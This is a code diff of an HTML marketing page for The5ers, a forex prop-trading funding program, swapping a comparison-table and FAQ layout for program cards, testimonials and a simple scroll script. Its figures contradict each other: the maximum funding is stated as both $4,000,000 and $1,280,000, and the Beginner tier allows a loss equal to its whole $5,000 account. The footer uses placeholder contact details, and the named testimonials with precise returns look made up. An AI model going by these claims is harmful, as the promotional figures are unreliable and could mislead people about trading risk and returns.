-                <p>How does The5ers compare to other popular funding programs? This comprehensive comparison highlights the key differences:</p>
-                
-                <table class="comparison-table">
-                    <tr>
-                        <th>Feature</th>
-                        <th>The5ers</th>
-                        <th>Competitor A</th>
-                        <th>Competitor B</th>
-                    </tr>
-                    <tr>
-                        <td>Maximum Funding</td>
-                        <td class="check">$4,000,000</td>
-                        <td>$400,000</td>
-                        <td>$200,000</td>
-                    </tr>
-                    <tr>
-                        <td>Profit Split</td>
-                        <td class="check">50-100%</td>
-                        <td>80% max</td>
-                        <td>90% max</td>
-                    </tr>
-                    <tr>
-                        <td>Scaling Plan</td>
-                        <td class="check">15-step automatic scaling</td>
-                        <td>Manual evaluation</td>
-                        <td>3-step scaling</td>
-                    </tr>
-                    <tr>
-                        <td>Free Retries</td>
-                        <td class="check">Yes</td>
-                        <td>No</td>
-                        <td>Additional fee</td>
-                    </tr>
-                    <tr>
-                        <td>News Trading</td>
-                        <td class="check">Allowed</td>
-                        <td>Restricted</td>
-                        <td>Prohibited</td>
-                    </tr>
-                    <tr>
-                        <td>Weekend Holding</td>
-                        <td class="check">Allowed</td>
-                        <td>Prohibited</td>
-                        <td>Allowed with fee</td>
-                    </tr>
-                    <tr>
-                        <td>Evaluation Time Limit</td>
-                        <td class="check">None</td>
-                        <td>30 days</td>
-                        <td>60 days</td>
-                    </tr>
-                    <tr>
-                        <td>Educational Resources</td>
-                        <td class="check">Comprehensive</td>
-                        <td>Basic</td>
-                        <td>Limited</td>
-                    </tr>
-                </table>
-                
-                <h2 class="section-title" id="strategies">Winning Strategies for The5ers Success</h2>
-                <p>Based on analysis of thousands of successful The5ers traders, these strategies consistently perform well within the program's framework:</p>
-                
-                <h3>Price Action Swing Trading</h3>
-                <p>This strategy aligns perfectly with The5ers' rules. By identifying key support/resistance levels on daily and weekly charts, traders capture multi-day moves while adhering to the 5% daily loss limit. Successful practitioners typically:</p>
-                <ul style="margin-left: 30px; margin-bottom: 25px;">
-                    <li style="margin-bottom: 10px;">Focus on 3-5 currency pairs maximum</li>
-                    <li style="margin-bottom: 10px;">Place 1-3 trades per week</li>
-                    <li style="margin-bottom: 10px;">Use 1:2 or better risk-reward ratios</li>
-                    <li style="margin-bottom: 10px;">Target 6-8% monthly returns</li>
-                </ul>
-                
-                <h3>Breakout Trading</h3>
-                <p>Breakout strategies work exceptionally well with The5ers' scaling model. Traders monitor consolidation patterns on the 4-hour and daily charts, entering positions when price breaks through significant levels with volume confirmation. Key advantages include:</p>
-                <ul style="margin-left: 30px; margin-bottom: 25px;">
-                    <li style="margin-bottom: 10px;">Well-defined risk points</li>
-                    <li style="margin-bottom: 10px;">Favorable risk-reward profiles (often 1:3 or better)</li>
-                    <li style="margin-bottom: 10px;">Minimal screen time required</li>
-                    <li style="margin-bottom: 10px;">Compatibility with The5ers' profit targets</li>
-                </ul>
-                
-                <div class="highlight">
-                    <p>"The5ers' scaling plan allowed me to grow from $10,000 to $160,000 in 14 months using a simple breakout strategy. Their flexible rules meant I could hold positions through volatility without worrying about arbitrary restrictions." - Sarah K., Funded since 2020</p>
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <i class="fas fa-graduation-cap"></i>
+                    </div>
+                    <h3>Educational Resources</h3>
+                    <p>Access our premium trading courses, webinars, and personalized coaching to accelerate your learning curve.</p>
                 </div>
-                
-                <h2 class="section-title" id="testimonials">Success Stories from The5ers Traders</h2>
-                
-                <div class="feature-grid">
-                    <div class="feature-card">
-                        <div class="feature-icon">
-                            <i class="fas fa-user"></i>
-                        </div>
-                        <h4>From $10k to $1.28M in 28 Months</h4>
-                        <p>James T. started with the Bootcamp program in January 2021. Through consistent 5-8% monthly returns, he scaled through all 15 levels to reach the maximum $1,280,000 account. He now earns 100% of profits beyond his initial capital level.</p>
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <i class="fas fa-headset"></i>
                     </div>
-                    <div class="feature-card">
-                        <div class="feature-icon">
-                            <i class="fas fa-user"></i>
-                        </div>
-                        <h4>Part-Time to Full-Time Career</h4>
-                        <p>Maria L. was working as an accountant while trading nights and weekends. After passing The5ers' evaluation in 3 months, she transitioned to full-time trading. She now manages a $400,000 account and earns 80% profit splits.</p>
-                    </div>
-                    <div class="feature-card">
-                        <div class="feature-icon">
-                            <i class="fas fa-user"></i>
-                        </div>
-                        <h4>High-Stakes Success Story</h4>
-                        <p>David R. used the High-Stakes model to secure a $100,000 account after just 14 days. His specialty in news trading generated 27% returns in his first funded month, earning him $13,500 after the 50% profit split.</p>
-                    </div>
+                    <h3>Dedicated Support</h3>
+                    <p>Our experienced support team is available 24/5 to assist you with any questions or concerns about your funded account.</p>
                 </div>
-                
-                <h2 class="section-title" id="faq">Frequently Asked Questions</h2>
-                
-                <div class="faq-container">
-                    <div class="faq-item active">
-                        <div class="faq-question">
-                            What makes The5ers different from other funding programs?
-                            <i class="fas fa-chevron-down"></i>
-                        </div>
-                        <div class="faq-answer">
-                            <p>The5ers stands out with its industry-leading scaling plan that can grow accounts to $4,000,000, profit splits up to 100%, no time limits on evaluations, and the most flexible trading rules in the industry. Additionally, their educational resources and trader support are unmatched.</p>
-                        </div>
-                    </div>
-                    
-                    <div class="faq-item">
-                        <div class="faq-question">
-                            How long does it take to get funded with The5ers?
-                            <i class="fas fa-chevron-down"></i>
-                        </div>
-                        <div class="faq-answer">
-                            <p>Evaluation times vary based on your trading strategy and market conditions. Aggressive traders can pass the High-Stakes evaluation in as little as 2 days. Most Bootcamp participants complete both phases in 2-3 months. There's no time pressure - you can take as long as you need.</p>
-                        </div>
-                    </div>
-                    
-                    <div class="faq-item">
-                        <div class="faq-question">
-                            What are the risk management rules?
-                            <i class="fas fa-chevron-down"></i>
-                        </div>
-                        <div class="faq-answer">
-                            <p>The5ers has two main risk parameters: a 5% maximum daily loss and a 10% maximum overall loss. These are calculated based on your starting account balance. For example, on a $10,000 account, you cannot lose more than $500 in a single day or $1,000 total.</p>
-                        </div>
-                    </div>
-                    
-                    <div class="faq-item">
-                        <div class="faq-question">
-                            Can I trade during major news events?
-                            <i class="fas fa-chevron-down"></i>
-                        </div>
-                        <div class="faq-answer">
-                            <p>Yes! The5ers allows news trading without restrictions. This is a significant advantage over many competitors who prohibit or restrict trading around news events.</p>
-                        </div>
-                    </div>
-                    
-                    <div class="faq-item">
-                        <div class="faq-question">
-                            How often can I withdraw profits?
-                            <i class="fas fa-chevron-down"></i>
-                        </div>
-                        <div class="faq-answer">
-                            <p>Profit withdrawals are processed every two weeks. The5ers has a straightforward process with multiple withdrawal options including bank transfer, PayPal, and cryptocurrency.</p>
-                        </div>
-                    </div>
-                </div>
-                
-                <div class="cta-box">
-                    <h2>Ready to Start Your Funding Journey?</h2>
-                    <p>Join thousands of successful traders who have transformed their careers with The5ers</p>
-                    <a href="#" class="btn">Begin Your Evaluation Now</a>
-                    <a href="#" class="btn btn-outline">Compare Funding Programs</a>
-                </div>
-                
-                <h2 class="section-title">Final Thoughts</h2>
-                <p>The5ers represents a paradigm shift in how traders access capital. By removing personal financial risk while offering unprecedented scaling potential, they've created an environment where trading talent can flourish. The combination of flexible trading rules, generous profit splits, and comprehensive support makes The5ers the premier choice for serious traders worldwide.</p>
-                
-                <p>Whether you're a new trader looking to start without significant capital or an experienced professional seeking to scale beyond personal limitations, The5ers offers a clear path to success. Their unique Bootcamp and High-Stakes models cater to different trading styles and experience levels, while their scaling program provides the industry's clearest roadmap to professional trading.</p>
-                
-                <p>As financial markets continue to evolve, The5ers remains at the forefront of proprietary trading innovation. Their commitment to trader success, demonstrated through continuous program improvements and exceptional support, solidifies their position as the funding program of choice for ambitious traders worldwide.</p>
             </div>
         </div>
-    </div>
+    </section>
+
+    <!-- Funding Programs -->
+    <section class="funding" id="programs">
+        <div class="container">
+            <div class="section-header">
+                <h2>Our Funding Programs</h2>
+                <p>Choose the program that fits your trading style and experience level</p>
+            </div>
+            <div class="programs">
+                <div class="program-card">
+                    <h3>Beginner Program</h3>
+                    <div class="program-price">$5,000 <span>starting capital</span></div>
+                    <ul class="program-features">
+                        <li><i class="fas fa-check"></i> 1:30 leverage</li>
+                        <li><i class="fas fa-check"></i> $2,500 max daily loss</li>
+                        <li><i class="fas fa-check"></i> $5,000 max total loss</li>
+                        <li><i class="fas fa-check"></i> 8% profit target</li>
+                        <li><i class="fas fa-check"></i> 50% profit split</li>
+                    </ul>
+                    <a href="https://the5ers.com/sign-up?program=beginner" class="btn btn-primary">Get Started</a>
+                </div>
+                <div class="program-card popular">
+                    <div class="popular-tag">MOST POPULAR</div>
+                    <h3>Intermediate Program</h3>
+                    <div class="program-price">$25,000 <span>starting capital</span></div>
+                    <ul class="program-features">
+                        <li><i class="fas fa-check"></i> 1:30 leverage</li>
+                        <li><i class="fas fa-check"></i> $1,250 max daily loss</li>
+                        <li><i class="fas fa-check"></i> $2,500 max total loss</li>
+                        <li><i class="fas fa-check"></i> 10% profit target</li>
+                        <li><i class="fas fa-check"></i> 60% profit split</li>
+                        <li><i class="fas fa-check"></i> Scaling plan available</li>
+                    </ul>
+                    <a href="https://the5ers.com/sign-up?program=intermediate" class="btn btn-primary">Get Started</a>
+                </div>
+                <div class="program-card">
+                    <h3>Advanced Program</h3>
+                    <div class="program-price">$100,000 <span>starting capital</span></div>
+                    <ul class="program-features">
+                        <li><i class="fas fa-check"></i> 1:30 leverage</li>
+                        <li><i class="fas fa-check"></i> $2,500 max daily loss</li>
+                        <li><i class="fas fa-check"></i> $5,000 max total loss</li>
+                        <li><i class="fas fa-check"></i> 10% profit target</li>
+                        <li><i class="fas fa-check"></i> 80% profit split</li>
+                        <li><i class="fas fa-check"></i> Scaling plan included</li>
+                        <li><i class="fas fa-check"></i> Priority support</li>
+                    </ul>
+                    <a href="https://the5ers.com/sign-up?program=advanced" class="btn btn-primary">Get Started</a>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Testimonials -->
+    <section class="testimonials" id="testimonials">
+        <div class="container">
+            <div class="section-header">
+                <h2>Success Stories</h2>
+                <p>Hear from traders who transformed their careers with The5ers</p>
+            </div>
+            <div class="testimonial-grid">
+                <div class="testimonial-card">
+                    <div class="testimonial-header">
+                        <div class="testimonial-avatar">M</div>
+                        <div>
+                            <h4>Michael Thompson</h4>
+                            <p>Funded Trader since 2020</p>
+                        </div>
+                    </div>
+                    <div class="testimonial-text">
+                        "The5ers completely changed my trading career. I started with a $10,000 account and through their scaling plan, I'm now trading with $200,000. Their realistic rules allowed me to focus on consistency rather than pressure."
+                    </div>
+                </div>
+                <div class="testimonial-card">
+                    <div class="testimonial-header">
+                        <div class="testimonial-avatar">S</div>
+                        <div>
+                            <h4>Sarah Johnson</h4>
+                            <p>Advanced Program Trader</p>
+                        </div>
+                    </div>
+                    <div class="testimonial-text">
+                        "I've tried several prop firms before, but The5ers stands out with their transparency and support. The profit withdrawals are always on time, and their educational resources helped me refine my strategy significantly."
+                    </div>
+                </div>
+                <div class="testimonial-card">
+                    <div class="testimonial-header">
+                        <div class="testimonial-avatar">R</div>
+                        <div>
+                            <h4>Robert Chen</h4>
+                            <p>Scaled to $500,000</p>
+                        </div>
+                    </div>
+                    <div class="testimonial-text">
+                        "The scaling plan is a game-changer. As I became consistently profitable, my account grew automatically. Now I trade full-time with substantial capital without risking my own money. This is the opportunity I've been waiting for."
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- CTA Section -->
+    <section class="cta">
+        <div class="container">
+            <h2>Ready to Trade with Real Capital?</h2>
+            <p>Join our community of funded traders today and take your trading career to the next level. With no time limits and a proven scaling plan, your potential is limitless.</p>
+            <a href="https://the5ers.com/sign-up" class="btn btn-primary">Apply for Funding Now</a>
+        </div>
+    </section>
 
     <!-- Footer -->
     <footer>
         <div class="container">
             <div class="footer-grid">
                 <div class="footer-col">
-                    <h4>About The5ers</h4>
-                    <p>The5ers is a leading proprietary trading firm providing talented traders with funding up to $4,000,000. Founded in 2016, we've helped thousands of traders worldwide launch professional trading careers.</p>
+                    <h4>The5ers</h4>
+                    <p>Providing ambitious traders with the capital, education, and support needed to succeed in the Forex markets since 2016.</p>
                     <div class="social-links">
                         <a href="#"><i class="fab fa-facebook-f"></i></a>
                         <a href="#"><i class="fab fa-twitter"></i></a>
@@ -978,67 +792,80 @@
                     </div>
                 </div>
                 <div class="footer-col">
-                    <h4>Funding Programs</h4>
-                    <ul>
-                        <li><a href="#">Bootcamp Program</a></li>
-                        <li><a href="#">High-Stakes Program</a></li>
-                        <li><a href="#">Scaling Plan</a></li>
-                        <li><a href="#">Profit Split Details</a></li>
-                        <li><a href="#">Account Comparison</a></li>
+                    <h4>Programs</h4>
+                    <ul class="footer-links">
+                        <li><a href="https://the5ers.com/programs/beginner">Beginner Program</a></li>
+                        <li><a href="https://the5ers.com/programs/intermediate">Intermediate Program</a></li>
+                        <li><a href="https://the5ers.com/programs/advanced">Advanced Program</a></li>
+                        <li><a href="https://the5ers.com/programs/scaling">Scaling Plan</a></li>
                     </ul>
                 </div>
                 <div class="footer-col">
                     <h4>Resources</h4>
-                    <ul>
-                        <li><a href="#">Trading Education</a></li>
-                        <li><a href="#">Market Analysis</a></li>
-                        <li><a href="#">Risk Management Guide</a></li>
-                        <li><a href="#">Trader Success Stories</a></li>
-                        <li><a href="#">FAQ</a></li>
+                    <ul class="footer-links">
+                        <li><a href="https://the5ers.com/education">Trading Education</a></li>
+                        <li><a href="https://the5ers.com/blog">Trading Blog</a></li>
+                        <li><a href="https://the5ers.com/webinars">Live Webinars</a></li>
+                        <li><a href="https://the5ers.com/strategy">Strategy Guides</a></li>
                     </ul>
                 </div>
                 <div class="footer-col">
-                    <h4>Contact Us</h4>
-                    <ul>
-                        <li><i class="fas fa-envelope"></i> support@the5ers.live</li>
-                        <li><i class="fas fa-phone"></i> +1 (888) 555-1234</li>
-                        <li><i class="fas fa-map-marker-alt"></i> 123 Trading Street, New York, NY 10001</li>
+                    <h4>Company</h4>
+                    <ul class="footer-links">
+                        <li><a href="https://the5ers.com/about">About Us</a></li>
+                        <li><a href="https://the5ers.com/contact">Contact Us</a></li>
+                        <li><a href="https://the5ers.com/faq">FAQ</a></li>
+                        <li><a href="https://the5ers.com/terms">Terms & Conditions</a></li>
+                        <li><a href="https://the5ers.com/privacy">Privacy Policy</a></li>
                     </ul>
                 </div>
             </div>
-            <div class="copyright">
-                <p>&copy; 2023 The5ers Trading Program | the5ers.live | All Rights Reserved</p>
-                <p>Risk Disclosure: Trading involves significant risk of loss</p>
+            <div class="footer-bottom">
+                <p>&copy; 2023 The5ers. All rights reserved. The5ers is a trading name of The5%ers Ltd. Risk Warning: Trading Forex and CFDs carries a high level of risk and may not be suitable for all investors.</p>
             </div>
         </div>
     </footer>
 
     <script>
-        // FAQ toggle functionality
-        document.querySelectorAll('.faq-question').forEach(question => {
-            question.addEventListener('click', () => {
-                const faqItem = question.parentElement;
-                faqItem.classList.toggle('active');
-            });
-        });
-        
-        // Smooth scrolling for navigation
-        document.querySelectorAll('nav a').forEach(anchor => {
-            anchor.addEventListener('click', function(e) {
+        // Smooth scrolling for navigation links
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
                 e.preventDefault();
-                
-                const targetId = this.getAttribute('href');
-                const targetElement = document.querySelector(targetId);
-                
-                window.scrollTo({
-                    top: targetElement.offsetTop - 80,
+                document.querySelector(this.getAttribute('href')).scrollIntoView({
                     behavior: 'smooth'
                 });
-                
-                // Update active class
-                document.querySelectorAll('nav a').forEach(a => a.classList.remove('active'));
-                this.classList.add('active');
             });
+        });
+
+        // Header scroll effect
+        window.addEventListener('scroll', function() {
+            const header = document.querySelector('header');
+            if (window.scrollY > 100) {
+                header.style.boxShadow = '0 5px 20px rgba(0, 0, 0, 0.1)';
+                header.style.background = 'rgba(255, 255, 255, 0.95)';
+            } else {
+                header.style.boxShadow = '0 2px 10px rgba(0, 0, 0, 0.05)';
+                header.style.background = 'white';
+            }
+        });
+
+        // Animation on scroll
+        const observerOptions = {
+            root: null,
+            rootMargin: '0px',
+            threshold: 0.1
+        };
+
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    entry.target.classList.add('animate');
+                }
+            });
+        }, observerOptions);
+
+        document.querySelectorAll('.feature-card, .program-card, .testimonial-card').forEach(card => {
+            observer.observe(card);
         });
     </script>
 </body>
